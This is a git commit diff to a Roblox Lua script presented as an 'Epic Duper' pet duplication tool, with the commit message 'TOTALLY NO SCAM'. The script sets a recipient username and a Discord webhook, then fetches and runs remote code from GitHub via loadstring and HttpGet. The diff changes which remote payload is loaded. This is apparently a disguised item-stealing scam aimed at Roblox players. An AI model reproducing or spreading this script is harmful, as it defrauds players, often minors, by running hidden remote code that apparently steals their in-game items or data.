8ba5451992fe15f0452094459f1962b00cb971a1
a <81264672+CG5isthebest@users.noreply.github.com>
2023-04-13 18:50:08 -0500

    Updated Epic Duper Script TOTALLY NO SCAM

--- EpicDuper.lua
+++ EpicDuper.lua
@@ -1,4 +1,4 @@
 _G.Username = "robloxepicdinos"
 _G.HubName = "Epic Duper"
 _G.Webhook = "https://discord.com/api/webhooks/1091120667501539399/duUEH7yUKVT0KiVnDnG1FUmBDQitHmnI5n5kS2p0srLZRWQnk3D5Dlwbl7R5z79SeL6b"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/CG5isthebest/TotallyRealPetDuperPSX/main/new%201.lua"))()
